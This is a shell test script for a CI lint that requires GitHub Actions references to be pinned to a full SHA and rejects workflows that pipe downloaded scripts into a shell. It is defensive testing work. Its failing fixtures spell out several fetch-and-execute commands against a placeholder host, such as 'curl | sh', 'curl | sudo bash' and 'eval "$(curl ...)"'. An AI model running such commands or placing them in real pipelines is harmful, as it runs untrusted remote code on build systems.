#!/bin/sh
# SPDX-License-Identifier: AGPL-3.0-or-later
#
# Self-tests for scripts/check-actions-pinned.sh (AUD-RM0-INF-07). Each fixture
# is a one-file .github tree; the lint must pass the good ones and fail the bad.
set -eu

HERE=$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)
CHECK="$HERE/../check-actions-pinned.sh"
T=$(mktemp -d "${TMPDIR:-/tmp}/pin-test.XXXXXX")
trap 'rm -rf "$T"' EXIT
SHA=3d3c42e5aac5ba805825da76410c181273ba90b1
pass=0
failn=0

# case <want: pass|fail> <name> <file name> <line...>
case_() {
    want=$1 name=$2 fname=$3
    shift 3
    d="$T/c$((pass + failn))"
    mkdir -p "$d/workflows"
    { echo "on: push"; echo "jobs:"; echo "  j:"; echo "    steps:"
      for l in "$@"; do printf '      %s\n' "$l"; done; } > "$d/workflows/$fname"
    if sh "$CHECK" "$d" >"$T/out" 2>&1; then got=pass; else got=fail; fi
    if [ "$got" = "$want" ]; then pass=$((pass + 1)); echo "pin self-test: $name: ok"
    else failn=$((failn + 1)); echo "pin self-test: $name: FAILED (expected $want, got $got)"
        sed 's/^/    /' "$T/out"; fi
}

case_ pass "SHA pin with version comment" ci.yml "- uses: actions/checkout@$SHA # v7.0.1"
case_ pass "local action" ci.yml "- uses: ./.github/actions/setup-rust"
case_ pass "plain curl download (no exec)" ci.yml "- run: curl -fsSLo out.json https://example.org/x.json"
case_ fail "tag reference" ci.yml "- uses: actions/checkout@v4"
case_ fail "branch reference" ci.yml "- uses: actions/checkout@main"
case_ fail "no ref at all" ci.yml "- uses: actions/checkout"
case_ fail "short SHA" ci.yml "- uses: actions/checkout@3d3c42e # v7.0.1"
case_ fail "missing version comment" ci.yml "- uses: actions/checkout@$SHA"
case_ fail "upper-case .YML extension is scanned" CI.YML "- uses: actions/checkout@v4"
case_ fail "file name with spaces is scanned" "my ci.yaml" "- uses: actions/checkout@v4"
d="$T/prt"; mkdir -p "$d/workflows"; printf 'on: pull_request_target\njobs: {}\n' > "$d/workflows/a.yml"
if sh "$CHECK" "$d" >/dev/null 2>&1; then failn=$((failn+1)); echo "pin self-test: pull_request_target trigger: FAILED"
else pass=$((pass+1)); echo "pin self-test: pull_request_target trigger: ok"; fi
case_ fail "curl | sh" ci.yml "- run: curl -fsSL https://x.example/i.sh | sh"
case_ fail "curl | sudo bash" ci.yml "- run: curl -fsSL https://x.example/i.sh | sudo bash"
case_ fail "wget -O- | python3" ci.yml "- run: wget -O- https://x.example/i.py | python3"
case_ fail "bash <(curl ...)" ci.yml "- run: bash <(curl -fsSL https://x.example/i.sh)"
case_ fail "source <(curl ...)" ci.yml "- run: source <(curl -fsSL https://x.example/i.sh)"
case_ fail "eval \"\$(curl ...)\"" ci.yml "- run: eval \"\$(curl -fsSL https://x.example/i.sh)\""
case_ fail "curl -o f && sh f" ci.yml "- run: curl -fsSL -o i.sh https://x.example/i.sh && sh i.sh"
case_ fail "wget -O f; chmod +x f" ci.yml "- run: wget -O i https://x.example/i; chmod +x i"
d="$T/empty"; mkdir -p "$d"
if sh "$CHECK" "$d" >/dev/null 2>&1; then failn=$((failn+1)); echo "pin self-test: no workflow files fails closed: FAILED"
else pass=$((pass+1)); echo "pin self-test: no workflow files fails closed: ok"; fi

echo "pin self-test: $pass passed, $failn failed"
[ "$failn" -eq 0 ]
